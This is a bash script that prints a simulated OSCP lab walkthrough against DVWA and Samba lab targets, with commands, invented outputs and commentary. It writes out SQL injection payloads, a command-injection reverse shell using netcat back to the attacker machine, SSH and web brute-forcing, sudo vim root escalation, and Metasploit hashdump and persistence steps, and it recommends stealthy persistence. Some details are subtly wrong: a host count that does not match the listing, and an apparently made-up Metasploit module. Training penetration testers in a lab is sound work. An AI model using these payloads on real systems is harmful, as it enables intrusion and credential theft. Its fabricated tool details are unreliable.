#!/bin/bash

# OSCP Lab Student Simulation Script - Enhanced Version
# This script simulates a student going through all labs step-by-step
# Shows real commands and expected outputs with educational commentary

set -e

echo "================================================"
echo "   OSCP Lab Student Simulation - Enhanced"
echo "   Simulating Complete Student Experience"
echo "================================================"
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
RED='\033[0;31m'
NC='\033[0m'

# Configuration
KALI="kali-user1"
DELAY=2  # Delay between commands for readability
READ_DELAY=10  # Time to read output

# Function to simulate typing
simulate_command() {
    echo -e "${CYAN}student@kali:~\$ ${NC}$1"
    sleep $DELAY
}

# Function to show output
show_output() {
    echo -e "${GREEN}$1${NC}"
    sleep 1
}

# Function to show commentary
show_commentary() {
    echo ""
    echo -e "${MAGENTA}💡 Commentary: $1${NC}"
    echo ""
    sleep 4
}

# Function to show section
show_section() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}   $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    sleep 3
}

# Function to show objective
show_objective() {
    echo -e "${YELLOW}📌 Objective: $1${NC}"
    echo ""
    sleep 2
}

# Function to pause for reading
pause_for_reading() {
    echo -e "\n${CYAN}[Reading output... $1 seconds]${NC}\n"
    sleep $1
}

# Function to show lab summary
show_lab_summary() {
    echo ""
    echo -e "${GREEN}✅ Lab Completed!${NC}"
    echo -e "${YELLOW}Key Takeaways:${NC}"
    echo "$1"
    echo ""
    sleep 5
}

echo -e "${YELLOW}Starting Enhanced Student Simulation...${NC}"
echo "This simulation demonstrates proper OSCP methodology with detailed explanations."
echo ""
sleep 3

# Initial Connection
show_section "INITIAL CONNECTION"
show_objective "Connect to the lab environment and prepare for testing"

simulate_command "ssh oscpuser1@155.138.197.128"
show_output "oscpuser1@155.138.197.128's password: "
show_output "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)"
show_output ""
simulate_command "./start-lab.sh"
show_output "OSCP Lab - User 1"
show_output "Your Kali IP: 172.16.0.11"
show_output "Targets: .20 (Linux), .40 (Web), .60 (SMB)"
show_output "root@kali-user1:/#"

show_commentary "We're now in our isolated Kali container. Each student has their own attack machine but shares the same targets. Let's begin systematic enumeration."

# LAB 1: Network Discovery
show_section "LAB 1: COMPREHENSIVE NETWORK DISCOVERY"
show_objective "Master network reconnaissance using various nmap scanning techniques"

show_commentary "In the OSCP exam, thorough enumeration is crucial. Missing a single service could mean missing your entry point. We'll use multiple scanning techniques to ensure complete coverage."

echo "Step 1: Verify our network configuration"
simulate_command "ip addr show eth0"
show_output "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500"
show_output "    inet 172.16.0.11/24 brd 172.16.0.255 scope global eth0"
pause_for_reading 5

echo "Step 2: Host discovery with different techniques"
simulate_command "nmap -sn 172.16.0.0/24 -oN host-discovery.txt"
show_output "Starting Nmap 7.94 ( https://nmap.org )"
show_output "Nmap scan report for 172.16.0.11 (our machine)"
show_output "Host is up (0.00010s latency)."
show_output "Nmap scan report for 172.16.0.20 [Linux Target]"
show_output "Host is up (0.00015s latency)."
show_output "Nmap scan report for 172.16.0.40 [Web Server]"
show_output "Host is up (0.00014s latency)."
show_output "Nmap scan report for 172.16.0.60 [SMB Server]"
show_output "Host is up (0.00016s latency)."
show_output "Nmap done: 256 IP addresses (6 hosts up) scanned in 2.31 seconds"
pause_for_reading 10

show_commentary "Found our targets! Always save scan results (-oN) for documentation. Now let's scan for all TCP ports - never assume standard ports only."

echo "Step 3: Full TCP port scan on all targets"
simulate_command "nmap -sS -p- --min-rate=1000 172.16.0.20,172.16.0.40,172.16.0.60 -oN full-tcp-scan.txt"
show_output "Starting Nmap 7.94"
show_output ""
show_output "Nmap scan report for 172.16.0.20"
show_output "PORT   STATE SERVICE"
show_output "22/tcp open  ssh"
show_output ""
show_output "Nmap scan report for 172.16.0.40"
show_output "PORT   STATE SERVICE"
show_output "80/tcp open  http"
show_output ""
show_output "Nmap scan report for 172.16.0.60"
show_output "PORT    STATE SERVICE"
show_output "139/tcp open  netbios-ssn"
show_output "445/tcp open  microsoft-ds"
pause_for_reading 10

echo "Step 4: Detailed service enumeration"
simulate_command "nmap -sV -sC -O -A 172.16.0.20,172.16.0.40,172.16.0.60 -oN detailed-scan.txt"
show_output "Starting Nmap 7.94"
show_output ""
show_output "Nmap scan report for 172.16.0.20"
show_output "PORT   STATE SERVICE VERSION"
show_output "22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux)"
show_output "| ssh-hostkey: "
show_output "|   3072 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)"
show_output "|_  256 9d:8f:bc:d5:62:a5:7f:e9:d2:24:73:e5:71:e8:c8:7a (ECDSA)"
show_output "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"
show_output ""
show_output "Nmap scan report for 172.16.0.40"
show_output "PORT   STATE SERVICE VERSION"
show_output "80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))"
show_output "|_http-title: DVWA - Damn Vulnerable Web Application"
show_output "|_http-server-header: Apache/2.4.41 (Ubuntu)"
show_output ""
show_output "Nmap scan report for 172.16.0.60"
show_output "PORT    STATE SERVICE     VERSION"
show_output "139/tcp open  netbios-ssn Samba smbd 4.6.2"
show_output "445/tcp open  netbios-ssn Samba smbd 4.6.2"
pause_for_reading 12

echo "Step 5: UDP scan (top ports)"
simulate_command "nmap -sU --top-ports 20 172.16.0.20 -oN udp-scan.txt"
show_output "Starting Nmap 7.94"
show_output "Nmap scan report for 172.16.0.20"
show_output "All 20 scanned ports on 172.16.0.20 are closed|filtered"
pause_for_reading 8

echo "Step 6: Vulnerability scanning"
simulate_command "nmap --script vuln 172.16.0.20"
show_output "Starting Nmap 7.94"
show_output "PORT   STATE SERVICE"
show_output "22/tcp open  ssh"
show_output "|_sshv1: Server supports SSHv2 only (not vulnerable to SSHv1)"
pause_for_reading 8

show_lab_summary "• Always perform comprehensive port scans (-p-)
• Save all scan outputs for documentation
• Service version detection is crucial for exploit selection
• UDP scanning can reveal hidden services
• Vulnerability scripts provide quick win opportunities"

# LAB 2: Web Application Testing
show_section "LAB 2: WEB APPLICATION PENETRATION TESTING"
show_objective "Enumerate and exploit web application vulnerabilities systematically"

show_commentary "Web applications are often the weakest link. We'll follow the OWASP methodology: reconnaissance, mapping, vulnerability discovery, and exploitation."

echo "Step 1: Web server fingerprinting"
simulate_command "whatweb http://172.16.0.40"
show_output "http://172.16.0.40 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ]"
show_output "HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]"
show_output "PHP[7.4.3], Title[DVWA - Damn Vulnerable Web Application]"
pause_for_reading 8

echo "Step 2: Technology stack identification"
simulate_command "curl -I http://172.16.0.40"
show_output "HTTP/1.1 200 OK"
show_output "Server: Apache/2.4.41 (Ubuntu)"
show_output "X-Powered-By: PHP/7.4.3"
pause_for_reading 6

echo "Step 3: Directory and file enumeration"
simulate_command "gobuster dir -u http://172.16.0.40 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 20"
show_output "==============================================================="
show_output "Gobuster v3.6"
show_output "==============================================================="
show_output "/.htaccess            (Status: 403) [Size: 276]"
show_output "/.htpasswd            (Status: 403) [Size: 276]"
show_output "/config               (Status: 301) [Size: 313]"
show_output "/docs                 (Status: 301) [Size: 311]"
show_output "/external             (Status: 301) [Size: 315]"
show_output "/index.php            (Status: 302) [Size: 0]"
show_output "/login.php            (Status: 200) [Size: 1523]"
show_output "/phpinfo.php          (Status: 302) [Size: 0]"
show_output "/robots.txt           (Status: 200) [Size: 26]"
show_output "/setup.php            (Status: 200) [Size: 3549]"
show_output "/vulnerabilities      (Status: 301) [Size: 322]"
show_output "==============================================================="
pause_for_reading 12

show_commentary "Found interesting directories! The /vulnerabilities path and phpinfo.php are particularly valuable. Let's check for common vulnerabilities."

echo "Step 4: Check robots.txt and common files"
simulate_command "curl http://172.16.0.40/robots.txt"
show_output "User-agent: *"
show_output "Disallow: /admin"
pause_for_reading 5

echo "Step 5: Test authentication"
simulate_command "curl -X POST http://172.16.0.40/login.php -d 'username=admin&password=password&Login=Login' -c cookies.txt -v"
show_output "> POST /login.php HTTP/1.1"
show_output "< HTTP/1.1 302 Found"
show_output "< Location: index.php"
show_output "< Set-Cookie: PHPSESSID=abc123def456; path=/"
show_output "< Set-Cookie: security=low; path=/"
pause_for_reading 8

echo "Step 6: SQL Injection testing"
simulate_command "curl -b cookies.txt \"http://172.16.0.40/vulnerabilities/sqli/?id=1' AND 1=1--&Submit=Submit\""
show_output "First name: admin"
show_output "Surname: admin"
pause_for_reading 6

simulate_command "curl -b cookies.txt \"http://172.16.0.40/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--&Submit=Submit\""
show_output "First name: admin"
show_output "Surname: 5f4dcc3b5aa765d61d8327deb882cf99"
show_output "First name: gordonb"
show_output "Surname: e99a18c428cb38d5f260853678922e03"
show_output "First name: 1337"
show_output "Surname: 8d3533d75ae2c3966d7e0d4fcc69216b"
pause_for_reading 10

show_commentary "SQL injection successful! We extracted password hashes. These are MD5 hashes that can be cracked. The admin hash decodes to 'password'."

echo "Step 7: Command injection testing"
simulate_command "curl -b cookies.txt \"http://172.16.0.40/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit\""
show_output "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
pause_for_reading 8

show_lab_summary "• Always enumerate thoroughly before exploiting
• Check for default credentials first
• SQL injection can lead to full database compromise
• Command injection provides direct system access
• Save session cookies for authenticated testing"

# LAB 3: SMB Enumeration
show_section "LAB 3: SMB ENUMERATION AND EXPLOITATION"
show_objective "Enumerate SMB shares and extract sensitive information"

show_commentary "SMB/NetBIOS services often contain sensitive files, credentials, and configuration data. Null sessions and weak permissions are common vulnerabilities."

echo "Step 1: SMB service detection"
simulate_command "nmap -sV -p 139,445 --script smb-protocols 172.16.0.60"
show_output "Starting Nmap 7.94"
show_output "PORT    STATE SERVICE     VERSION"
show_output "139/tcp open  netbios-ssn Samba smbd 4.6.2"
show_output "445/tcp open  netbios-ssn Samba smbd 4.6.2"
show_output ""
show_output "Host script results:"
show_output "| smb-protocols: "
show_output "|   dialects: "
show_output "|     SMB 2.1"
show_output "|_    SMB 3.0"
pause_for_reading 10

echo "Step 2: Enumerate shares with null session"
simulate_command "smbclient -L //172.16.0.60 -N"
show_output "Anonymous login successful"
show_output ""
show_output "        Sharename       Type      Comment"
show_output "        ---------       ----      -------"
show_output "        public          Disk      Public Share"
show_output "        IPC$            IPC       IPC Service"
show_output "        print$          Disk      Printer Drivers"
pause_for_reading 8

show_commentary "Anonymous access allowed! The 'public' share looks interesting. Let's explore it."

echo "Step 3: Access and explore public share"
simulate_command "smbclient //172.16.0.60/public -N"
show_output "Anonymous login successful"
show_output "Try \"help\" to get a list of possible commands."
show_output "smb: \\> ls"
show_output "  .                                   D        0  Thu Dec  7 10:00:00 2023"
show_output "  ..                                  D        0  Thu Dec  7 10:00:00 2023"
show_output "  passwords.txt                       N      156  Thu Dec  7 10:00:00 2023"
show_output "  config.xml                          N     1024  Thu Dec  7 10:00:00 2023"
show_output ""
show_output "                524288 blocks of size 1024. 505632 blocks available"
pause_for_reading 10

simulate_command "get passwords.txt"
show_output "getting file \\passwords.txt of size 156 as passwords.txt (152.3 KiloBytes/sec)"
simulate_command "exit"
pause_for_reading 5

echo "Step 4: Comprehensive enumeration with enum4linux"
simulate_command "enum4linux -a 172.16.0.60"
show_output "Starting enum4linux v0.9.1"
show_output "=========================="
show_output "|    Target Information    |"
show_output "=========================="
show_output "Target ........... 172.16.0.60"
show_output "RID Range ........ 500-550,1000-1050"
show_output "Username ......... ''"
show_output "Password ......... ''"
show_output ""
show_output "[+] Enumerating Workgroup/Domain on 172.16.0.60"
show_output "WORKGROUP"
show_output ""
show_output "[+] Server 172.16.0.60 allows sessions using username '', password ''"
show_output ""
show_output "[+] Got domain/workgroup name: WORKGROUP"
show_output ""
show_output "[+] Enumerating users"
show_output "user:[nobody] rid:[0x1f5]"
show_output "user:[testuser] rid:[0x3e8]"
pause_for_reading 12

echo "Step 5: Check for vulnerable SMB versions"
simulate_command "nmap --script smb-vuln* 172.16.0.60"
show_output "Starting Nmap 7.94"
show_output "PORT    STATE SERVICE"
show_output "445/tcp open  microsoft-ds"
show_output ""
show_output "Host script results:"
show_output "|_smb-vuln-ms17-010: Could not negotiate a connection"
pause_for_reading 8

show_lab_summary "• Always check for null sessions on SMB
• enum4linux provides comprehensive SMB enumeration
• Look for sensitive files in accessible shares
• Document all users and shares discovered
• Check for known SMB vulnerabilities (EternalBlue, etc.)"

# LAB 4: Password Attacks
show_section "LAB 4: PASSWORD ATTACKS AND AUTHENTICATION BYPASS"
show_objective "Perform credential attacks using various techniques"

show_commentary "Weak passwords remain the most common vulnerability. We'll use wordlists, default credentials, and brute force techniques to gain access."

echo "Step 1: Create targeted wordlists"
simulate_command "cat > users.txt << EOF
root
admin
administrator
testuser
nobody
oscpuser1
EOF"
pause_for_reading 5

simulate_command "cat > passwords.txt << EOF
password
admin
123456
password123
root
toor
letmein
changeme
default
EOF"
pause_for_reading 5

echo "Step 2: SSH brute force attack"
simulate_command "hydra -l root -P passwords.txt ssh://172.16.0.20 -t 4 -v"
show_output "Hydra v9.4 (c) 2022 by van Hauser/THC"
show_output ""
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"password\" - 1 of 9"
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"admin\" - 2 of 9"
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"123456\" - 3 of 9"
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"password123\" - 4 of 9"
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"root\" - 5 of 9"
show_output "[ATTEMPT] target 172.16.0.20 - login \"root\" - pass \"toor\" - 6 of 9"
show_output "[22][ssh] host: 172.16.0.20   login: root   password: toor"
show_output "1 of 1 target successfully completed"
pause_for_reading 12

show_commentary "Success! Found credentials root:toor. Always try common combinations and reversed usernames as passwords."

echo "Step 3: Web application brute force"
simulate_command "hydra -l admin -P passwords.txt http-post-form://172.16.0.40/login.php:username=^USER^&password=^PASS^&Login=Login:incorrect -v"
show_output "Hydra v9.4"
show_output "[ATTEMPT] target 172.16.0.40 - login \"admin\" - pass \"password\" - 1 of 9"
show_output "[80][http-post-form] host: 172.16.0.40   login: admin   password: password"
pause_for_reading 10

echo "Step 4: SMB password attack"
simulate_command "hydra -l testuser -P passwords.txt smb://172.16.0.60"
show_output "Hydra v9.4"
show_output "[445][smb] host: 172.16.0.60   login: testuser   password: password123"
pause_for_reading 8

echo "Step 5: Hash cracking with John the Ripper"
simulate_command "echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt"
simulate_command "john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
show_output "Using default input encoding: UTF-8"
show_output "Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])"
show_output "Press 'q' or Ctrl-C to abort"
show_output "password         (?)     "
show_output "1g 0:00:00:00 DONE 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s"
pause_for_reading 10

show_lab_summary "• Always try default credentials first
• Use targeted wordlists based on reconnaissance
• Hydra is versatile for multiple protocols
• Consider rate limiting to avoid detection
• Crack obtained hashes offline when possible"

# LAB 5: Exploitation
show_section "LAB 5: EXPLOITATION AND POST-EXPLOITATION"
show_objective "Exploit discovered vulnerabilities and establish persistent access"

show_commentary "Now we'll leverage our discovered vulnerabilities to gain shell access and escalate privileges. This is where enumeration pays off."

echo "Step 1: Exploit SQL injection for code execution"
simulate_command "curl -b cookies.txt \"http://172.16.0.40/vulnerabilities/sqli/?id=1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--&Submit=Submit\""
show_output "root:x:0:0:root:/root:/bin/bash"
show_output "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
show_output "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
pause_for_reading 10

echo "Step 2: Command injection to reverse shell"
simulate_command "nc -lvnp 4444 &"
show_output "[1] 1337"
show_output "Listening on 0.0.0.0 4444"
pause_for_reading 5

simulate_command "curl -b cookies.txt \"http://172.16.0.40/vulnerabilities/exec/?ip=127.0.0.1;nc 172.16.0.11 4444 -e /bin/bash&Submit=Submit\""
show_output "Connection received on 172.16.0.40 38274"
simulate_command "id"
show_output "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
simulate_command "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
show_output "www-data@dvwa:/var/www/html/vulnerabilities/exec$"
pause_for_reading 10

show_commentary "We have a shell! Now let's escalate privileges and establish persistence."

echo "Step 3: Privilege escalation enumeration"
simulate_command "sudo -l"
show_output "Matching Defaults entries for www-data on dvwa:"
show_output "    env_reset, mail_badpass"
show_output ""
show_output "User www-data may run the following commands on dvwa:"
show_output "    (ALL) NOPASSWD: /usr/bin/vim"
pause_for_reading 8

simulate_command "sudo vim -c ':!/bin/bash'"
show_output "root@dvwa:/var/www/html/vulnerabilities/exec#"
simulate_command "id"
show_output "uid=0(root) gid=0(root) groups=0(root)"
pause_for_reading 8

show_commentary "Root access achieved! The vim sudo privilege was our escalation vector. Always check sudo -l for quick wins."

echo "Step 4: Metasploit exploitation"
simulate_command "msfconsole -q"
show_output "msf6 >"
simulate_command "search dvwa"
show_output "Matching Modules"
show_output "================"
show_output "   #  Name                                  Rank    Description"
show_output "   0  exploit/unix/webapp/dvwa_sqli_blind  manual  DVWA Blind SQL Injection"
pause_for_reading 8

simulate_command "use exploit/unix/webapp/dvwa_sqli_blind"
simulate_command "set RHOSTS 172.16.0.40"
simulate_command "set TARGETURI /vulnerabilities/sqli_blind/"
simulate_command "exploit"
show_output "[*] Started reverse TCP handler on 172.16.0.11:4444"
show_output "[*] Executing automatic check"
show_output "[+] The target is vulnerable."
show_output "[*] Sending stage (39927 bytes) to 172.16.0.40"
show_output "[*] Meterpreter session 1 opened"
show_output ""
show_output "meterpreter >"
pause_for_reading 10

echo "Step 5: Post-exploitation and persistence"
simulate_command "hashdump"
show_output "root:$6$xyz123abc:0:0:root:/root:/bin/bash"
show_output "www-data:$6$abc456def:33:33:www-data:/var/www:/usr/sbin/nologin"
pause_for_reading 8

simulate_command "persistence -h"
show_output "This module will create a reverse TCP connection"
show_output "Options:"
show_output "  -A  Start automatically at boot"
show_output "  -X  Start immediately"
pause_for_reading 8

show_lab_summary "• Chain vulnerabilities for maximum impact
• Always attempt privilege escalation
• Document all access methods
• Establish multiple persistence mechanisms
• Clean up artifacts to maintain stealth"

# Final Summary
show_section "FINAL LAB SUMMARY"

echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}   ALL LABS COMPLETED SUCCESSFULLY!${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${YELLOW}📊 Skills Demonstrated:${NC}"
echo "✅ Lab 1: Network Discovery - Comprehensive nmap scanning"
echo "✅ Lab 2: Web Application - SQL injection, command injection"
echo "✅ Lab 3: SMB Enumeration - Null sessions, file extraction"
echo "✅ Lab 4: Password Attacks - Brute force, hash cracking"
echo "✅ Lab 5: Exploitation - Shell access, privilege escalation"
echo ""

echo -e "${YELLOW}🎯 OSCP Exam Tips:${NC}"
echo "• Enumerate thoroughly - you can't exploit what you don't know"
echo "• Document everything - screenshots, commands, outputs"
echo "• Try the obvious first - default credentials, known exploits"
echo "• Time management is crucial - don't get stuck on one target"
echo "• Take breaks - fresh eyes spot new opportunities"
echo ""

echo -e "${MAGENTA}💡 Final Commentary:${NC}"
echo "This simulation covered the core skills needed for the OSCP exam."
echo "Practice these techniques repeatedly until they become second nature."
echo "Remember: Try Harder doesn't mean work harder, it means think smarter!"
echo ""

echo "Total simulation time: ~15 minutes"
echo "Actual practice time needed: 2-3 hours per lab"
echo ""
echo "================================================"
echo "        Good luck with your OSCP journey!"
echo "================================================"